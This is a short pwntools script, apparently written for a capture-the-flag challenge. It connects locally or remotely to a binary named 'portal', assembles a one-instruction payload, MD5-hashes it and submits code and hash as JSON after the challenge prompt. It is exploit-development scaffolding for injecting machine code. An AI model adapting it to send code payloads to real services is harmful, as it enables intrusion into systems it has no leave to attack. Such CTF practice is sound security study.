#!/usr/bin/env python
from pwn import *
from time import sleep
import json
import hashlib

context.binary = e = ELF("portal")

gs = """
brva 0x2A9E
ida_connect
set debuginfod enabled on
"""


def start():
    global gdbPid, gdbIo
    if args.LOCAL:
        p = e.process()
        if args.GDB:
            gdbPid, gdbIo = gdb.attach(p, gdbscript=gs, api=True)
            pause()
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


md5 = hashlib.md5()

p = start()

code = asm("ret")
md5.update(code)

toSend = {
    "seed": 111.12,
    "code": code.hex().upper(),
    "hash": md5.hexdigest().upper()
}

p.sendlineafter(
    b"INCEPTION: Get ready to enter into a nightmare. Your mission is to take a secret key from your mind.\n",
    json.dumps(toSend).encode()
)

p.interactive()
